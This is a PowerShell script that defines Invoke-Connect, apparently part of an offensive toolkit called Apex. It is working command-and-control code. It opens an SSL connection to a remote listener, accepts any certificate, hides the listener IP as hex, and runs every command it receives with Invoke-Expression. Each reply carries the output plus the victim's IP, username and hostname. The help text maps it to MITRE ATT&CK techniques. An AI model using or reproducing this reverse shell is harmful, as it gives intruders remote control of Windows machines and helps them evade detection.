function Invoke-Connect {
<# 

.SYNOPSIS
	Transfers all Apex functionality to a remote SSL listener, and also functions as a non-interactive powershell reverse "shell" if invoked as a stand-alone cmdlet.

.PARAMETER Help
	Shows Detailed Help.

.PARAMETER List
	Shows Brief Command Help.

.PARAMETER ListenerIp
	The Listener IP Address.

.PARAMETER ListenerPort
	The Listener Port.

.EXAMPLE 
	PS> Invoke-Connect -ListenerIp 192.168.1.1 -ListenerPort 443
	
.NOTES
	Author: Fabrizio Siciliano (@0rbz_)

#>

[CmdletBinding()]
param(
	[Parameter(Position=1)]
	[Switch]$Help,
	[Switch]$List,
	
	[Parameter(Position=0,Mandatory = $False)]
	[string]$ListenerIp,
	
	[Parameter(Position=1,Mandatory = $False)]
	[string]$ListenerPort
)

	if ($Help -or $List) {
		Write @"
		
 ### Invoke-Connect Help ###
 ---------------------------
 Available Invoke-Connect Commands:
 ----------------------------------
 |--------------------------------------------------------------------------------|
 | [-ListenerIp] listener_ip [-ListenerPort] listener_port                        |
 |--------------------------------------------------------------------------------|

   [*] Description: Transfers all Apex functionality to a remote SSL listener, and 
       also functions as a non-interactive powershell reverse "shell" if invoked as 
       a stand-alone cmdlet.

       (SSL-enabled listener is required)

   [*] Usage: Invoke-Connect -ListenerIp 192.168.1.1 -ListenerPort 443

   [*] Mitre ATT&CK Ref: T1086 (PowerShell)
   [*] Mitre ATT&CK Ref: T1043 (Commonly Used Port)
   [*] Mitre ATT&CK Ref: T1352 (C2 Protocol Development)

 \--------------------------------------------------------------------------------/

"@
	}
	elseif ($ListenerIp -and $ListenerPort) {
		if ($PSVersionTable.PSVersion.Major -eq "2") {
			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
			return
		}
		else {
			# https://stackoverflow.com/questions/11581914/converting-ip-address-to-hex
			
			# Use a hex-ified listener IP address for C2 comms
			$ListenerIp = "$ListenerIp"
			$ar = $ListenerIp.Split('.')
			$Octet1 = "{0:X2}" -f [int]$ar[0]
			$Octet2 = "{0:X2}" -f [int]$ar[1]
			$Octet3 = "{0:X2}" -f [int]$ar[2]
			$Octet4 = "{0:X2}" -f [int]$ar[3]
			$Hexip = "0x"+$Octet1 + $Octet2 + $Octet3 + $Octet4
			
			[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

			$socket = New-Object System.Net.Sockets.TCPClient($Hexip,$ListenerPort)
			$stream = $socket.GetStream()
			$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))

			$sslStream.AuthenticateAsClient($Hexip)

			[byte[]]$bytes = 0..65535|%{0}
			while(($x = $sslStream.Read($bytes,0,$bytes.Length)) -ne 0) {
				$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$x)
				$flow = (Invoke-Expression $data | Out-String) + '[' + (Test-Connection -ComputerName $env:computername -count 1).IPV4Address.ipaddressTOstring +']'+'['+$env:username+'@'+$env:computername+']> '
				$flow2 = ([text.encoding]::ASCII).GetBytes($flow)
				$sslStream.Write($flow2,0,$flow2.Length)
				$sslStream.Flush()
			}
		}
	}
}

